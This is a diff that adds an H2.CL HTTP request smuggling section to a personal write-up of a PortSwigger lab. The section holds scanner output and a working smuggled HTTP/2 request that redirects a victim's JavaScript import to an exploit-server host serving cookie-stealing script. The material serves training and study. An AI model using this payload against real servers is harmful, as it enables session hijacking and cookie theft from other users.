@@ -199,5 +199,90 @@ Here I use the <b>d</b> letter as place-holder, that I will change for every req
 Then I struggled a bit to find the right length, since if it exceed the actual length of the victim request we got a server error, after some attempts I found the correct value: <b>783</b>
 <br>![img](./img/135.png)<br>
 Now with session cookie value we cant try to access the my-account page, before doing that enable the Intercept in the Proxy, once you get the request change the cookie value with the one you got in the previous step, forward the request to solve the lab
-<br>![img](./img/136.png)<br>
+<br>![img](./img/136.png)
+
+### H2<span>.</span>CL request smuggling
+This vulnerability works in principle similar to the TE<span>.</span>CL vulnerability but here the front-end uses HTTP/2 and ignores the Content-Length Header, that is passed unchanged to the back-end. The back-end uses HTTP/1.1 and therefore interprets the Content-Length header.
+
+Since the back-end finishes processing the request earlier than what the front-end sent due to the content length being 0, the rest of the request remains in the pipeline between the front-end and the back-end. As soon as a next request arrives, the remainder of the previous request that is still in the pipeline is added before this new request. So a new request would look like this in the back-end.
+
+
+#### Lab
+The lab is vulnerable to request smuggling because the front-end server uses HTTP/2 and ignore content-length, passing the header to backend, that indeed supports this header. 
+
+To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds.
+<i>Note the lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, <b>you need to enable the Allow HTTP/2 ALPN override option and manually change the protocol to HTTP/2 using the Inspector.</b></i> 
+
+Again we can use HTTP request smuggler -> HTTP/2 probe. I found an issue related to TE
+
+    Updating active thread pool size to 8
+    Loop 0
+    Queued 1 attacks from 1 requests in 0 seconds
+    Found issue: HTTP/2 TE desync v10a h2path
+    Target: https://0a43007104f02a22c25d6645005f00cd.web-security-academy.net
+    .
+    Evidence: 
+    ======================================
+    POST / HTTP/2
+    Host: 0a43007104f02a22c25d6645005f00cd.web-security-academy.net
+    Cookie: session=jlafxRkB3HnK8xF3sbEW7xAm45Yu4ahZ
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+    Accept-Encoding: gzip, deflate
+    Referer: https://0a43007104f02a22c25d6645005f00cd.web-security-academy.net/
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 13
+    :path: / HTTP/1.1^~Transfer-Encoding: chunked^~x: x
+
+    3
+    x=y
+    0
+But actually it wasn't clear to me, since the Lab referes to CL vulnerability, the POC here shows a possible TE vulnerability. In the logger we can see the request path that caused the server error
+<br>![img](./img/156.png)<br>
+Anyway the important thing here is that the back-end supports HTTP/1 request. Now let's try to set the content length to 0 following some dummy data (remember that in HTTP/2 there is data-frame length field, so the Content-Length header is not required anymore. However, the HTTP/2 RFC states that this header is permitted, provided it's correct).
+<br>![img](./img/157.png)<br>
+The second time we send the request we got a not found error, that confirm that the back-end server is vulnerable to CL smuggling as well.
+Reading the hint we know that to exploit tha application we have to poison the request immediately before the victim's browser attempts to import a JavaScript resource, injecting our malicious payload. To accomplish that we have to induce the backe-end server to perform a redirect to our exploit server. Looking to the HTML source code we can see that the JS scripts reside into the resources folder
+
+    ...
+    <body>
+        <script type="text/javascript" src="/resources/js/analyticsFetcher.js"></script>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+    ...
+Let's first try using a dummy value for the host to see if the redirection takes place (again submit the request 2 times)
+<br>![img](./img/158.png)<br>
+<i>Please note that from here my lab ID and session cookie changed</i>
+Now we can host our malicious payload to steal the cookie of another user (the user that will perform the next request after we sent the smuggling request). First we oper the exploit server to configure our malicious JS code to get the user's cookie:
+<br>![img](./img/159.png)<br>
+As shown above we changed the file to point to the application resources folder (1), in the body we put out exploit (2) then click store (3) to save the changes. 
+
+Come back to Repeater and change the request as follows:
+
+    POST / HTTP/2
+    Host: 0a4300da044d4acac1ceb7d000340089.web-security-academy.net
+    Content-Length: 0
+
+    GET /resources HTTP/1.1
+    Host: exploit-0ab80047045f4ae4c1c7b61f01e70076.exploit-server.net
+    Content-Length: 3
+
+    A
+
+Send the request two times and you should get a redirect to the exploit server. No check the access log on the exploit server (4 in the above iamge) and you should see that the Victim actually requested the exploit (1)
+<br>![img](./img/160.png)<br>
+Now keep submitting your request until the lab is solved, here the tricky part is that we have to inject the smuggler request immediately before the victim's browser attempts to import a JS resource, otherwise, although the victim requests our malicious JS payload, it won't execute it. Be patiend, to me it taked almost a hour 😥
+
+#### Reference
++ https://portswigger.net/research/http2#introduction
++ https://www.digitalocean.com/community/tutorials/http-1-1-vs-http-2-what-s-the-difference
++ https://www.scip.ch/en/?labs.20220707 
++ https://book.hacktricks.xyz/pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades
 
